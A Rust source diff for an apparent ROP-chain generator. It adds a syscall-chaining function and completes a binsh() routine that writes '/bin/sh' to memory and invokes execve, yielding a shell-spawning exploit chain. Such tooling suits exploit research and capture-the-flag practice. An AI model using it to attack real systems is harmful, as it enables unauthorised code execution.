@@ -36,7 +36,7 @@ impl std::fmt::Display for RopElement {
     }
 }
 
-pub fn find_write_what_where(gadgets: &Vec<Gadget>) -> Result<Vec<Gadget>, &'static str> {
+pub fn find_write_what_where(gadgets: &Vec<Gadget>) -> Result<Vec<Gadget>, String> {
     let mut www_gadgets: Vec<Gadget> = Vec::new();
 
     for gadget in gadgets {
@@ -53,7 +53,7 @@ pub fn find_write_what_where(gadgets: &Vec<Gadget>) -> Result<Vec<Gadget>, &'sta
     }
 
     if www_gadgets.len() == 0 {
-        return Err("Cannot find write what where gadget");
+        return Err(String::from("Cannot find write what where gadget"));
     }
 
     Ok(www_gadgets)
@@ -63,7 +63,7 @@ pub fn pop(
     gadgets: &Vec<Gadget>,
     register: Register,
     value: u64,
-) -> Result<Vec<RopElement>, &'static str> {
+) -> Result<Vec<RopElement>, String> {
     for g in gadgets {
         for i in 1..g.instructions.len() {
             let instruction = g.instructions[i];
@@ -88,14 +88,14 @@ pub fn pop(
         }
     }
 
-    Err("Cannot find pop")
+    Err(format!("Cannot find pop {:?}", register))
 }
 
 pub fn write_data(
     gadgets: &Vec<Gadget>,
     data: &Vec<u64>,
     address: u64,
-) -> Result<Vec<RopElement>, &'static str> {
+) -> Result<Vec<RopElement>, String> {
     let www_gadgets = find_write_what_where(&gadgets);
 
     let www_gadgets = match www_gadgets {
@@ -103,7 +103,7 @@ pub fn write_data(
         Err(e) => return Err(e),
     };
 
-    /* try to find a usable one */
+    /* try to find a usable one, we need to be able to pop the two registers */
     for g in www_gadgets {
         let reg_src = g.instructions[1].op1_register();
         let reg_dst = g.instructions[1].memory_base();
@@ -136,28 +136,130 @@ pub fn write_data(
         }
     }
 
-    Err("Impossible to find the gadgets needed to write bytes")
+    Err(String::from(
+        "Impossible to find the gadgets needed to write bytes",
+    ))
+}
+
+pub fn syscall(
+    gadgets: &Vec<Gadget>,
+    syscall_nb: u64,
+    nbr_args: u64,
+    param0: u64,
+    param1: u64,
+    param2: u64,
+    param3: u64,
+    param4: u64,
+    param5: u64,
+) -> Result<Vec<RopElement>, String> {
+    let mut rop: Vec<RopElement> = Vec::new();
+
+    let mut pop_rax = match pop(gadgets, Register::RAX, syscall_nb) {
+        Ok(e) => e,
+        Err(e) => return Err(e),
+    };
+
+    rop.append(&mut pop_rax);
+
+    if nbr_args >= 1 {
+        let mut pop_rdi = match pop(gadgets, Register::RDI, param0) {
+            Ok(e) => e,
+            Err(e) => return Err(e),
+        };
+
+        rop.append(&mut pop_rdi);
+    }
+
+    if nbr_args >= 2 {
+        let mut pop_rsi = match pop(gadgets, Register::RSI, param1) {
+            Ok(e) => e,
+            Err(e) => return Err(e),
+        };
+
+        rop.append(&mut pop_rsi);
+    }
+
+    if nbr_args >= 3 {
+        let mut pop_rdx = match pop(gadgets, Register::RDX, param2) {
+            Ok(e) => e,
+            Err(e) => return Err(e),
+        };
+
+        rop.append(&mut pop_rdx);
+    }
+
+    if nbr_args >= 4 {
+        let mut pop_rcx = match pop(gadgets, Register::RCX, param3) {
+            Ok(e) => e,
+            Err(e) => return Err(e),
+        };
+
+        rop.append(&mut pop_rcx);
+    }
+
+    if nbr_args >= 5 {
+        let mut pop_r8 = match pop(gadgets, Register::R8, param4) {
+            Ok(e) => e,
+            Err(e) => return Err(e),
+        };
+
+        rop.append(&mut pop_r8);
+    }
+
+    if nbr_args >= 6 {
+        let mut pop_r9 = match pop(gadgets, Register::R9, param5) {
+            Ok(e) => e,
+            Err(e) => return Err(e),
+        };
+
+        rop.append(&mut pop_r9);
+    }
+    let syscall_gadget = match gadgets
+        .iter()
+        .find(|p| p.instructions[1].mnemonic() == Mnemonic::Syscall)
+    {
+        Some(e) => e,
+        None => return Err(String::from("Cannot find syscall gadget")),
+    };
+
+    rop.push(RopElement::new(
+        syscall_gadget.instructions[1].ip(),
+        RopElementKind::Gadget,
+    ));
+
+    Ok(rop)
 }
 
 /* 2f62696e2f7368 */
 const BINSH_STR: u64 = 0x68732F6E69622F;
+const EXECVE_SYS: u64 = 59;
 
-pub fn binsh(
-    gadgets: &Vec<Gadget>,
-    writable_address: u64,
-) -> Result<Vec<RopElement>, &'static str> {
+pub fn binsh(gadgets: &Vec<Gadget>, writable_address: u64) -> Result<Vec<RopElement>, String> {
     let mut ropchain: Vec<RopElement> = Vec::new();
 
-    if gadgets.len() == 0 {
-        return Err("Not enough gadgets to generate ropchain.");
-    }
-
-    let mut w = match write_data(gadgets, &vec![BINSH_STR], writable_address) {
+    let mut w = match write_data(gadgets, &vec![BINSH_STR, 0x0], writable_address) {
         Ok(r) => r,
         Err(e) => return Err(e),
     };
 
     ropchain.append(&mut w);
+
+    let mut syscall = match syscall(
+        gadgets,
+        EXECVE_SYS,
+        3,
+        writable_address,
+        writable_address + 8,
+        writable_address + 8,
+        0,
+        0,
+        0,
+    ) {
+        Ok(e) => e,
+        Err(e) => return Err(e),
+    };
+
+    ropchain.append(&mut syscall);
 
     Ok(ropchain)
 }
